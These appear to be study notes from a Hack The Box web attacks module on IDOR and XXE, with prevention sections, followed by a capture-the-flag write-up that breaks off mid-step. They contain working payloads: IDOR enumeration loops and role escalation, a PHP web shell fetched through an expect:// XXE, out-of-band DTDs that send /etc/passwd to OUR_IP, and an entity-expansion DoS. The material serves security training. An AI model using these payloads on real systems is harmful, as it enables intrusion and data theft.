  - `-s` = silent, `-O` = save the response **to a file**, `-J` = use the server''s suggested filename (from the `Content-Disposition` header).
  - `-X POST` sets the method to POST; `-d "contract=$hash"` sends the hash as POST data.

**Step 3 — Run the script and verify downloaded files**

```shellsession
bash ./exploit.sh
ls -1
```

- `bash ./exploit.sh` runs the script.
- `ls -1` lists the downloaded files, one per line (`-1`).

Output:

```
contract_006d1236aee3f92b8322299796ba1989.pdf
contract_0b24df25fe628797b3a50ae0724d2730.pdf
contract_0b7e7dee87b1c3b98e72131173dfbbbf.pdf
contract_3e57e65a34ffcb2e93cb545d024f5bde.pdf
contract_5d4aace023dc088767b4e08c79415dcd.pdf
contract_8b9af1f7f76daf0f02bd9c48c4a2e3d0.pdf
contract_b523ff8d1ced96cef9c86492e790c2fb.pdf
contract_cdd96d3cc73d1dbdaffa03cc6cd7339b.pdf
contract_d477819d240e7d3dd9499ed8d23e7158.pdf
contract_f7947d50da7a043693a592b4db43b0a1.pdf
```

All 10 employee contracts are downloaded successfully. By reversing the front-end hashing technique, we turned a reference that looked secure into a fully exploitable IDOR — and used it to mass enumerate private files across all user accounts.

---

### IDOR in Insecure APIs

So far, IDOR has been used to access files and resources outside our user''s access. But IDOR vulnerabilities can also exist in **API function calls**, allowing us to perform actions as other users — not just read their data.

There are two types to understand:

- **IDOR Information Disclosure** — reads other users'' data (files, records, profiles)
- **IDOR Insecure Function Calls** — calls APIs or executes functions as another user (change passwords, modify profiles, buy items, delete accounts)

In many real attacks, these two types are chained together — first leak data through Information Disclosure, then use that data to exploit Insecure Function Calls.

#### Identifying Insecure APIs

In the **Employee Manager** app, we navigate to the **Edit Profile** page. The page lets us edit `Full Name`, `Email`, and `About Me`. When we click **Update Profile** and intercept the request in Burp, we see a **PUT request** to `/profile/api.php/profile/1` with this JSON body:

```json
{
    "uid": 1,
    "uuid": "40f5888b67c748df7efba008e7c2f9d2",
    "role": "employee",
    "full_name": "Amy Lindon",
    "email": "a_lindon@employees.htb",
    "about": "A Release is like a boat. 80% of the holes plugged is not good enough."
}
```

> **Note on HTTP methods in APIs:** PUT = update, POST = create, DELETE = delete, GET = retrieve.

The interesting fields here are `uid`, `uuid`, and `role`. The `role` field is set to `employee` and is also reflected in the `Cookie: role=employee` header — meaning **access control is being handled on the client side**, which is a critical security mistake. An attacker could manipulate any of these fields. Unless the back-end has solid access control, we may be able to set an arbitrary, more privileged role — but first we need to learn what other role names exist.

#### Exploiting Insecure APIs

We know we can freely change `full_name`, `email`, and `about` (visible form fields). Now let''s test the hidden parameters to see what else we can control.

**Attempt 1 — Change `uid` to another user''s ID**

Set `"uid": 2` in the JSON body. The server responds with `uid mismatch`. The app is comparing the JSON `uid` to the API endpoint (`/1`), so this check stops us from directly hijacking another account this way.

**Attempt 2 — Change the API endpoint to another user**

Change the endpoint to `/profile/api.php/profile/2` and set `"uid": 2`. The server responds with `uuid mismatch`. The app is checking that the `uuid` in the request matches the target user''s actual UUID — and since we don''t know User 2''s UUID, we''re blocked again.

**Attempt 3 — Try creating a new user (POST request)**

Change the request method to POST and send a new `uid`. The server responds: `Creating new employees is for admins only`. Sending a DELETE request gives a similar response: `Deleting employees is for admins only`. The app is using the `role=employee` cookie to check authorization.

**Attempt 4 — Try changing role to admin**

Change `"role": "employee"` to `"role": "admin"` or `"role": "administrator"`. The server responds: `Invalid role`. Without knowing a valid role name, we cannot escalate privileges this way.

At this point, all direct function call attempts have failed. However, we have only been testing **IDOR Insecure Function Calls**. We have not yet tested the API''s **GET request for IDOR Information Disclosure**. If the GET endpoint has no access control, we may be able to read other users'' full profile details — including their `uuid` — which would unlock the attacks that failed above.

---

### Chaining IDOR Vulnerabilities

The most powerful IDOR attacks chain two types together: first **leak data** using IDOR Information Disclosure, then **abuse functions** using IDOR Insecure Function Calls. This section shows how those two work together to achieve full application takeover.

After the Edit Profile page loads, we notice the app sends a **GET request** to the same API endpoint (`/profile/api.php/profile/1`) to fetch our profile details. The only authorization in this request is the `Cookie: role=employee` header — there is no JWT token or any other user-specific verification. This means the back-end may not be checking whether the session belongs to the requested profile.

#### Information Disclosure

We send a GET request but change the UID in the endpoint to another user''s ID (e.g. `/profile/api.php/profile/2`). The server responds with that user''s full profile:

```json
{
    "uid": "2",
    "uuid": "4a9bd19b3b8676199592a346051f950c",
    "role": "employee",
    "full_name": "Iona Franklyn",
    "email": "i_franklyn@employees.htb",
    "about": "It takes 20 years to build a reputation and few minutes of cyber-incident to ruin it."
}
```

This confirms an **IDOR Information Disclosure vulnerability**. We now have User 2''s `uuid` — the exact value we were missing when our PUT request failed with `uuid mismatch`.

#### Modifying Other Users'' Details

Now that we have User 2''s `uuid`, we send a PUT request to `/profile/api.php/profile/2` using their `uid` and `uuid` alongside any changes we want to make. This time we get no access control errors, and a follow-up GET request confirms their details were successfully updated.

This opens up several follow-on attacks:

- **Account Takeover via Password Reset** — change the user''s email to one we control, then trigger a password reset. The reset link goes to our email.
- **XSS via Profile Field** — inject an XSS payload into the `about` field. When the user visits their Edit Profile page, the script executes and we can attack them further.

#### Chaining Two IDOR Vulnerabilities

Now we enumerate all users using the same GET request technique, looping through UIDs to collect everyone''s details. Eventually we find an admin account:

```json
{
    "uid": "X",
    "uuid": "a36fa9e66e85f2dd6f5e13cad45248ae",
    "role": "web_admin",
    "full_name": "administrator",
    "email": "webadmin@employees.htb",
    "about": "HTB{FLAG}"
}
```

We now know the valid admin role name: `web_admin`. Earlier, trying `"role": "admin"` gave us `Invalid role`. Now we can use the correct name.

**Step 1 — Set our own role to `web_admin`**

Intercept our own Update Profile PUT request and change `"role": "employee"` to `"role": "web_admin"`. This time we get no `Invalid role` error and no access control rejection. A follow-up GET confirms the change:

```json
{
    "uid": "1",
    "uuid": "40f5888b67c748df7efba008e7c2f9d2",
    "role": "web_admin",
    "full_name": "Amy Lindon",
    "email": "a_lindon@employees.htb",
    "about": "A Release is like a boat. 80% of the holes plugged is not good enough."
}
```

**Step 2 — Update the session cookie**

Refresh the page to update the cookie automatically, or manually set `Cookie: role=web_admin` in Burp to use the new role immediately.

**Step 3 — Create or delete users**

Now send a POST request to create a new user — no error this time. A GET request confirms the new user was created successfully. We can also delete users with a DELETE request, since the `Deleting employees is for admins only` check now passes with our admin role.

By combining an **IDOR Information Disclosure** vulnerability (leaking UUIDs and role names) with an **IDOR Insecure Function Call** (setting our own role and modifying others'' data), we achieved full administrative control over the entire application — bypassing every access control check that initially blocked us. With admin rights we could also do **mass assignment** attacks, such as changing every user''s email or planting XSS in all profiles.

---

### IDOR Prevention

IDOR vulnerabilities are mainly caused by **improper access control on the back-end**. To prevent them, two things must work together: a strong object-level access control system, and secure object referencing that avoids predictable or guessable IDs.

#### Object-Level Access Control (RBAC)

Access control should be at the core of any web application''s design, as it affects every area of the system. The most reliable approach is a **Role-Based Access Control (RBAC)** system that maps user roles and permissions to every object and resource in the application.

Once RBAC is in place, every request a user makes is checked against their assigned role. The back-end either allows or denies the request based on whether the user has the right privileges for that specific object. Here is an example of secure access control logic:

```javascript
match /api/profile/{userId} {
    allow read, write: if user.isAuth == true
    && (user.uid == userId || user.roles == ''admin'');
}
```

This code retrieves the user''s role and identity from the **server-side session token** — not from a cookie or JSON body sent by the client. A user can only read or write their own profile (`user.uid == userId`), unless they have the `admin` role verified on the back-end. This is the right approach because user privileges are never passed through the HTTP request where the client could manipulate them.

In our attacks, we exploited role values stored in cookies (`Cookie: role=employee`) and JSON request bodies (`"role": "employee"`) — both under the client''s control. The above RBAC example eliminates that risk entirely by keeping privileges server-side.

#### Object Referencing

Even with a solid access control system, using predictable object references like `uid=1` makes it trivial for attackers to guess and enumerate other IDs. We should always use **strong, unique, unpredictable references** like **UUIDs (Version 4)**:

```
89c9b29b-d19f-4515-b2dd-abb6e693eb20
```

UUIDs are generated server-side when an object is created, stored in the back-end database, and mapped to the actual internal record. Whenever a UUID is received in a request, the database uses the map to return the correct object. This is how it can look in PHP:

```php
$uid = intval($_REQUEST[''uid'']);
$query = "SELECT url FROM documents where uid=" . $uid;
$result = mysqli_query($conn, $query);
$row = mysqli_fetch_array($result);
echo "<a href=''" . $row[''url''] . "'' target=''_blank''></a>";
```

Key rules to follow for secure object referencing:

- **Never calculate hashes on the front-end** — always generate them server-side when the object is created.
- **Store UUIDs in the database** and create maps for quick cross-referencing.
- **UUIDs alone are not enough** — they make IDOR harder to find but won''t stop it if access control is broken. As we saw in this module, even unique references can be exploited by replaying one user''s request with another user''s session.

Implementing both strong access control (RBAC) and strong object referencing (UUIDs) together provides solid protection against IDOR vulnerabilities.

---

## Section 3: XML External Entity (XXE) Injection

---

### Intro to XXE

XXE (XML External Entity) Injection is a vulnerability that occurs when an application parses XML input from a user without properly sanitizing or restricting it. This allows attackers to inject malicious XML that references external entities — like local files on the server — and have their content returned in the response.

XXE is considered one of OWASP''s Top 10 Web Security Risks because of how much damage it can cause — from reading sensitive config files and source code, to stealing credentials, executing remote code, or even crashing the server with a Denial of Service attack.

#### XML Basics

XML (Extensible Markup Language) is a markup language used to store and transfer structured data. Unlike HTML (which displays data), XML is focused on organizing and representing data structures. XML documents are formed of element trees, where each element is denoted by a tag. The first element is called the **root element**, and all others are **child elements**.

Here is a basic example of an XML email document:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<email>
  <date>01-01-2022</date>
  <time>10:00 am UTC</time>
  <sender>john@inlanefreight.com</sender>
  <recipients>
    <to>HR@inlanefreight.com</to>
    <cc>
        <to>billing@inlanefreight.com</to>
        <to>payslips@inlanefreight.com</to>
    </cc>
  </recipients>
  <body>
  Hello,
      Kindly share with me the invoice for the payment made on January 1, 2022.
  Regards,
  John
  </body>
</email>
```

Key XML components:

| Component   | Definition                                       | Example                   |
| ----------- | ------------------------------------------------ | ------------------------- |
| Tag         | Keys of an XML document, wrapped with `</>`      | `<date>`                  |
| Entity      | XML variables, wrapped with `&;`                 | `&lt;`                    |
| Element     | A tag and its value between start and end tags   | `<date>01-01-2022</date>` |
| Attribute   | Optional specifications stored inside a tag      | `version="1.0"`           |
| Declaration | First line of an XML file, sets version/encoding | `<?xml version="1.0"?>`   |

Some characters are reserved as part of XML document structure: `<`, `>`, `&`, and `"`. If you need to use these inside an XML document as data (not structure), you must replace them with their **entity references**:

| Character | Entity Reference |
| --------- | ---------------- |
| `<`       | `&lt;`           |
| `>`       | `&gt;`           |
| `&`       | `&amp;`          |
| `"`       | `&quot;`         |

XML also supports comments using `<!-- comment -->`, the same as HTML.

#### XML DTD (Document Type Definition)

A DTD defines and validates the expected structure of an XML document — which elements exist, which are children of which, and what type of data they contain. The DTD can be defined **inside the XML document itself** or stored in an **external file**.

Here is an example DTD for the email XML document above:

```xml
<!DOCTYPE email [
  <!ELEMENT email (date, time, sender, recipients, body)>
  <!ELEMENT recipients (to, cc?)>
  <!ELEMENT cc (to*)>
  <!ELEMENT date (#PCDATA)>
  <!ELEMENT time (#PCDATA)>
  <!ELEMENT sender (#PCDATA)>
  <!ELEMENT to (#PCDATA)>
  <!ELEMENT body (#PCDATA)>
]>
```

The DTD declares the root `email` element and lists its child elements. Each child is then declared individually. `#PCDATA` means the element contains raw text data (Parsed Character Data). Elements with `?` are optional and elements with `*` can repeat.

The DTD can be embedded directly in the XML right after the declaration, or stored externally and referenced with the `SYSTEM` keyword:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email SYSTEM "email.dtd">
```

It can also be referenced via a URL:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email SYSTEM "http://inlanefreight.com/email.dtd">
```

This works similarly to how HTML documents link to external JavaScript or CSS files.

#### XML Entities

XML entities act like **variables** inside a DTD. They allow you to define a value once and reuse it throughout the document, reducing repetitive data. Entities are defined using the `ENTITY` keyword:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
```

Once defined, you reference the entity anywhere in the document using `&company;`. The XML parser will replace `&company;` with `Inlane Freight` every time it encounters it.

More importantly, XML entities can also be **external** — meaning they reference a file or URL using the `SYSTEM` keyword:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "http://localhost/company.txt">
  <!ENTITY signature SYSTEM "file:///var/www/html/signature.txt">
]>
```

> **Note:** The `PUBLIC` keyword can be used instead of `SYSTEM` for publicly declared standards or resources (e.g. language codes like `lang="en"`). In most cases, both work the same way.

When you reference `&signature;` in the XML document, the parser replaces it with the contents of `signature.txt` from the server. **This is the core of XXE attacks.** When XML is parsed on the server-side — in SOAP APIs, contact forms, or file upload functions — an external entity can reference a sensitive file on the back-end server, and its contents get returned to the attacker when the entity is referenced in the response.

---

### Local File Disclosure

When a web application trusts unfiltered XML input, an attacker can define external XML entities that reference local files on the server. If the application reflects any of those entity values back in the response, the file contents get displayed to the attacker. This is the core of an XXE Local File Disclosure attack.

#### Identifying

The first step is finding a web page that accepts XML input. A common example is a **Contact Form**. Fill in the form, click Send, and intercept the request in Burp Suite. If the request body is in XML format (e.g. with `<name>`, `<email>`, `<message>` tags), it is a potential XXE target.

Next, check if any field value is **reflected back in the response**. For example, if the response shows `Check your email email@example.com for further instructions`, then the `<email>` field value is being echoed back. This tells us which field to inject into.

> **Note:** Some apps default to JSON but still accept XML. Try changing the `Content-Type` header to `application/xml` and convert the JSON body to XML with an online tool. If the app accepts it, test for XXE.

#### Step-by-Step: Exploiting XXE to Read Local Files

**Step 1 — Test if entities are processed**

Add a custom internal entity to the XML and reference it in the reflected field:

```xml
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
```

Use `&company;` in the `<email>` field. If the response shows `Inlane Freight` instead of `&company;` as a raw string, the parser is processing entities — the app is vulnerable to XXE.

> **Note:** If the XML request has no existing DTD, add the `DOCTYPE` block before defining your entity. If a `DOCTYPE` is already present, just add the `ENTITY` line inside it.

**Step 2 — Reference a local file**

Replace the internal entity with an external one using the `SYSTEM` keyword and the `file://` path:

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
```

Use `&company;` in the `<email>` field and send the request. If the response contains the contents of `/etc/passwd`, the XXE exploit worked. From here, you can read any file the web server process has access to — SSH keys, config files with database passwords, `.env` files, and more.

> **Tip:** In Java web applications, you can sometimes specify a **directory path** instead of a file, and the response will contain a directory listing — useful for finding sensitive files.

**Step 3 — Read PHP source code using the base64 filter**

Directly referencing a PHP file usually fails because PHP code contains XML-breaking characters like `<`, `>`, and `&`. Use PHP''s `php://filter` wrapper to base64-encode the file first so it doesn''t break the XML format:

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```

The response will contain a base64-encoded string. Select it in Burp Suite and check the **Inspector tab** on the right pane — it will automatically decode and show the PHP source code. You can also decode it yourself on the command line with `echo -n "<base64>" | base64 -d`.

> **Note:** This trick only works on PHP-based web applications.

#### Remote Code Execution via XXE

Beyond file reading, XXE can sometimes be used for **Remote Code Execution (RCE)**. There are a few approaches:

- **SSH keys** — read `/home/user/.ssh/id_rsa` and use it to SSH into the server.
- **Hash stealing** — on Windows, use XXE to trigger an SMB request to your server and capture the hash.
- **PHP expect filter** — if the server has the PHP `expect` module installed, you can run commands directly using `expect://id`. However, this module is **not installed by default** on modern PHP servers.

The most reliable RCE method is uploading a web shell:

**Step 1 — Create the web shell and start an HTTP server:**

```shellsession
echo ''<?php system($_REQUEST["cmd"]);?>'' > shell.php
sudo python3 -m http.server 80
```

Commands explained:
- `echo ''<?php system($_REQUEST["cmd"]);?>'' > shell.php` writes a one-line PHP web shell to `shell.php`. It runs whatever command is sent in the `cmd` parameter.
- `sudo python3 -m http.server 80` starts a simple web server on **port 80** so the target can download `shell.php`; `sudo` is needed because port 80 is privileged.

**Step 2 — Use XXE with the `expect` filter to download your shell:**

```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS''OUR_IP/shell.php''">
]>
<root>
<name></name>
<tel></tel>
<email>&company;</email>
<message></message>
</root>
```

> **Note:** Spaces in the command are replaced with `$IFS` to avoid breaking the XML syntax (`$IFS` is the shell''s internal field separator, which expands to whitespace). Characters like `|`, `>`, and `{` can also break the command, so avoid them.

Once the server fetches your `shell.php`, you can interact with it for code execution. Because `expect` is rarely available, XXE is most reliably used for **file disclosure** rather than RCE.

#### Other XXE Attacks

**SSRF via XXE**

XXE can be used to perform **Server-Side Request Forgery (SSRF)** attacks — making the server send HTTP requests to internal services, enumerate open ports, or access restricted internal web pages. This is done by pointing the external entity to an internal URL:

```xml
<!ENTITY company SYSTEM "http://localhost:8080/admin">
```

**Denial of Service (DoS) via Entity Loops**

XXE can be used to crash the server by defining a chain of self-referencing entities that expand exponentially, consuming all server memory:

```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY a0 "DOS" >
  <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
  <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
  <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
  <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
  <!ENTITY a5 "&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;">
  <!ENTITY a6 "&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;">
  <!ENTITY a7 "&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;">
  <!ENTITY a8 "&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;">
  <!ENTITY a9 "&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;">
  <!ENTITY a10 "&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;">
]>
<root>
<name></name>
<tel></tel>
<email>&a10;</email>
<message></message>
</root>
```

`a0` is defined as `DOS`, then `a1` references it 10 times, `a2` references `a1` 10 times, and so on. By the time `&a10;` is expanded, the server has to process billions of entity references — causing memory exhaustion. Modern web servers like Apache protect against this, so this attack may not work on updated systems.

---

### Advanced File Disclosure

Not all XXE vulnerabilities are straightforward to exploit. Some file formats cannot be read through basic XXE because their content breaks the XML format. In other cases, the web application may not output any input values at all, so we need to force the data out through errors or out-of-band channels.

#### Advanced Exfiltration with CDATA

In the Local File Disclosure section, we used PHP''s `php://filter` to base64-encode PHP source files so they wouldn''t break the XML format. But this only works for PHP. For any other web framework, we need a different approach.

We can wrap the file content in a **CDATA tag** (`<![CDATA[ FILE_CONTENT ]]>`). The XML parser treats everything inside CDATA as raw data — it ignores special characters like `<`, `>`, and `&` inside it. This allows us to include any file content without breaking the XML format.

The naive approach would be to define three internal entities and join them:

```xml
<!DOCTYPE email [
  <!ENTITY begin "<![CDATA[">
  <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY end "]]>">
  <!ENTITY joined "&begin;&file;&end;">
]>
```

However, **this does not work** — XML prevents joining internal and external entities together. We need a different approach.

The solution is to use **XML Parameter Entities** — a special entity type that starts with `%` and can only be used inside a DTD. The key property is: if parameter entities are referenced from an **external DTD file** hosted on our server, they are all treated as external and can be joined freely.

**Step 1 — Create the xxe.dtd file on your machine and host it:**

```shellsession
echo ''<!ENTITY joined "%begin;%file;%end;">'' > xxe.dtd
python3 -m http.server 8000
```

Commands explained:
- `echo ''...'' > xxe.dtd` writes the `joined` parameter-entity definition into a file named `xxe.dtd`.
- `python3 -m http.server 8000` serves the current folder on **port 8000**, so the target can fetch `xxe.dtd`.

Output:

```
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

**Step 2 — Send this XML payload to the target:**

```xml
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA[">         <!-- prepend the beginning of the CDATA tag -->
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
  <!ENTITY % end "]]>">                 <!-- append the end of the CDATA tag -->
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> <!-- reference our external DTD -->
  %xxe;
]>
...
<email>&joined;</email>               <!-- reference the &joined; entity to print the file content -->
```

When processed, the server fetches your `xxe.dtd` file, uses it to join the CDATA wrapper around the file content, and returns the full PHP source code in the response — without any base64 encoding and without breaking the XML format.

> **Note:** On some modern web servers, you may not be able to read files like `index.php` because the server protects against entity self-reference loops (which can cause a DoS). If that happens, try other files.

This technique works with **any web framework**, not just PHP, making it very useful when basic XXE methods fail.

#### Error-Based XXE

Sometimes a web application does not display any XML entity output at all — we have no reflected field to inject into. However, if the application **displays PHP runtime errors** and lacks proper exception handling, we can exploit those errors to leak file content.

**How it works:** First, confirm the app shows errors by sending malformed XML — delete a closing tag, use `<roo>` instead of `<root>`, or reference a non-existing entity. If the app throws a PHP error and reveals the server directory path in the message, we can use that to our advantage.

**Step 1 — Create the error-triggering DTD file and host it:**

```xml
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM ''%nonExistingEntity;/%file;''>">
```

This defines two parameter entities:

- `%file` reads the target file
- `%error` tries to load a path that joins a non-existing entity with the file content — which triggers an error containing the file content in the error message

**Step 2 — Send the payload referencing your DTD:**

```xml
<!DOCTYPE email [
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>
```

The server loads your DTD, tries to process `%nonExistingEntity;/%file;` — a path that doesn''t exist — and throws an error message that includes the `%file;` content as part of the invalid URI. The file content appears in the error output.

> **Note:** This method can also be used to read source code files, but it is less reliable than the CDATA method — it may have length limitations, and special characters in the file can still break the error output.

---

### Blind Data Exfiltration

In the previous section, the app displayed PHP errors which we used to leak file content. But what if the app shows **no output at all** — no reflected entities, no error messages? This is a completely blind XXE situation, and it requires a different strategy called **Out-of-Band (OOB) Data Exfiltration**.

Instead of making the app print file content to the page, we make the app **send the file content to our own server** via an HTTP request. This is the same concept used in blind SQL injection, blind command injection, and blind XSS — the app never shows us anything, but it makes outbound requests that we can capture.

#### Out-of-Band Data Exfiltration

The attack works like this:

1. We host a DTD file on our machine
2. The vulnerable app fetches our DTD
3. The DTD instructs the app to read a local file, base64-encode it, and send it to our server as a URL parameter
4. We capture and decode the data on our end

**Step 1 — Create the OOB exfiltration DTD (`xxe.dtd`) on your machine:**

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM ''http://OUR_IP:8000/?content=%file;''>">
```

- `%file` reads `/etc/passwd` and base64-encodes it using PHP''s filter
- `%oob` creates an entity that makes an HTTP request to our server, placing the base64 data as a URL query parameter `?content=`

**Step 2 — Create a PHP listener (`index.php`) that decodes and logs incoming data:**

```php
<?php
if(isset($_GET[''content''])){
    error_log("\n\n" . base64_decode($_GET[''content'']));
}
?>
```

This script reads the `content` parameter from incoming GET requests, base64-decodes it, and logs the result to the terminal.

**Step 3 — Start your PHP server:**

```shellsession
vi index.php   # write the above PHP code
php -S 0.0.0.0:8000
```

Commands explained:
- `vi index.php` opens the `vi` editor so you can paste the decoding PHP code and save it as `index.php`.
- `php -S 0.0.0.0:8000` starts PHP''s built-in server on **all interfaces**, port **8000**, so the target can reach it and the script runs on each request.

Output:

```
PHP 7.4.3 Development Server (http://0.0.0.0:8000) started
```

**Step 4 — Send the XXE payload to the target:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```

- `%remote` fetches your hosted DTD
- `%oob` is evaluated, creating the `content` entity that triggers the HTTP request back to your server with the file data
- `&content;` references the entity to trigger execution

**Step 5 — Receive and read the exfiltrated data on your terminal:**

```
PHP 7.4.3 Development Server (http://0.0.0.0:8000) started
10.10.14.16:46256 Accepted
10.10.14.16:46256 [200]: (null) /xxe.dtd
10.10.14.16:46256 Closing
10.10.14.16:46258 Accepted

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...SNIP...
```

The app never showed us anything — but it sent the file to us. The decoded content of `/etc/passwd` appears in our PHP server logs.

> **Tip:** Instead of sending base64 data as a URL query parameter, you can use **DNS OOB Exfiltration** — place the encoded data as a subdomain (e.g. `ENCODEDTEXT.our.website.com`) and capture it with `tcpdump`. This is more advanced and useful when HTTP outbound is blocked.

#### Automated OOB Exfiltration with XXEinjector

For faster and more automated exploitation, use **XXEinjector** — a Ruby tool that supports basic XXE, CDATA exfiltration, error-based XXE, and blind OOB XXE.

**Step 1 — Clone the tool:**

```shellsession
git clone https://github.com/enjoiz/XXEinjector.git
```

- `git clone <url>` downloads the tool''s repository into a local folder.

**Step 2 — Save the HTTP request from Burp to a file**

Copy the raw HTTP request and save it (e.g. `/tmp/xxe.req`). Include only the **first line of the XML body** and add `XXEINJECT` after it as a position marker for the tool:

```http
POST /blind/submitDetails.php HTTP/1.1
Host: 10.129.201.94
Content-Length: 169
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: http://10.129.201.94
Referer: http://10.129.201.94/blind/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT
```

**Step 3 — Run the tool:**

```shellsession
ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
```

| Flag          | Purpose                                  |
| ------------- | ---------------------------------------- |
| `--host`      | Your IP address (tun0 interface)         |
| `--httpport`  | Port your listener runs on               |
| `--file`      | Path to the saved HTTP request file      |
| `--path`      | The remote file you want to exfiltrate   |
| `--oob=http`  | Use HTTP for out-of-band exfiltration    |
| `--phpfilter` | Use PHP base64 filter to encode the file |

The tool won''t print the data directly (because it''s base64 encoded). All exfiltrated files are saved in the `Logs/` folder:

```shellsession
cat Logs/10.129.201.94/etc/passwd.log

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...SNIP...
```

- `cat <file>` prints the saved log file so you can read the recovered `/etc/passwd`.

---

### XXE Prevention

XXE vulnerabilities are primarily caused by **outdated XML libraries** rather than coding mistakes, making them easier to prevent through dependency management and safe XML configuration.

#### Avoiding Outdated Components

The most important step is keeping XML libraries up to date. For example, PHP''s `libxml_disable_entity_loader()` function is **deprecated since PHP 8.0** because it allows unsafe external entity loading. Using it in modern PHP code will trigger warnings in code editors like VSCode.

Beyond XML libraries, update any component that parses XML — including:

- API libraries like **SOAP**
- Document processors that handle **SVG images** or **PDF files**
- Any outdated **Node.js modules**

Using the latest versions of all web components greatly reduces the risk of XXE and many other web vulnerabilities.

#### Using Safe XML Configurations

Even after updating libraries, apply these XML configuration rules as a second layer of defense:

- **Disable custom DTD references** — prevents loading external document type definitions.
- **Disable external XML entities** — prevents the `SYSTEM` keyword from fetching files.
- **Disable parameter entity processing** — blocks the `%entity;` technique used in advanced attacks.
- **Disable XInclude support** — prevents another XML inclusion method from being abused.
- **Prevent entity reference loops** — stops Denial of Service attacks using recursive entities.
- **Disable runtime error display** — prevents error-based XXE exfiltration.

#### Additional Recommendations

- **Use JSON or YAML instead of XML** where possible — avoid XML-based API standards like SOAP and prefer REST (JSON-based) APIs instead.
- **Use a Web Application Firewall (WAF)** as an additional layer — but never rely on it alone, as WAFs can be bypassed.
- Safe XML configurations are a workaround, not a fix — always update your libraries first.

---

*End of Notes — Web Attacks Module (Sections 1–17)*

---

# HTB Web Challenge Writeup

## Vulnerability Chain: IDOR → HTTP Verb Tampering → Account Takeover → XXE → Flag

**Target:** `http://154.57.164.78:31956`
**Flag:** `HTB{m4573r_w3b_4774ck3r}`

---

## Overview

This challenge required chaining four distinct web vulnerabilities to capture the flag:

1. **IDOR** on the user API to enumerate all users and identify the admin
2. **IDOR** on the token API to steal the admin''s password reset token
3. **HTTP Verb Tampering** to bypass authorization on the password reset endpoint
4. **XXE Injection** on an authenticated endpoint to read `/flag.php`

Each bug on its own is limited. The power comes from the chain — each step produces exactly the piece of information or access the next step needs. This is what real-world exploitation usually looks like, and it is why reading source/JavaScript and testing every endpoint matters so much.

---

## Step 1: User Enumeration via IDOR

The application exposed a user API endpoint `/api.php/user/{id}` with no authorization check. We enumerated 100 users using a bash loop:

```bash
for i in $(seq 1 100); do
  echo "=== User $i ==="
  curl -s "http://154.57.164.78:31956/api.php/user/$i" \
    -H "Cookie: PHPSESSID=dpk5f8il07lfoth0an07qontrq; uid=74"
  echo
done
```

Command explained step by step:
- `for i in $(seq 1 100)` — `seq 1 100` prints the numbers 1 to 100, so the loop runs once per user ID `i`.
- `echo "=== User $i ==="` prints a header line so each response is easy to tell apart in the output.
- `curl -s "http://.../api.php/user/$i"` requests each user record silently (`-s`), substituting the current ID into the URL.
- `-H "Cookie: PHPSESSID=...; uid=74"` sends our **own** logged-in session cookie (our uid is 74). The endpoint only needs a valid session, not permission for that specific user — which is the IDOR.
- The trailing `echo` prints a blank line between records for readability.

**Key finding — User 52 stood out:**

```json
{"uid":"52","username":"a.corrales","full_name":"Amor Corrales","company":"Administrator"}
```

The `company` field contained **"Administrator"** instead of a real company name, indicating a privileged account.

---

## Step 2: Token IDOR — Steal Admin''s Reset Token

The `/api.php/token/{uid}` endpoint had no authorization check. Any logged-in user could fetch any user''s password reset token:

```shellsession
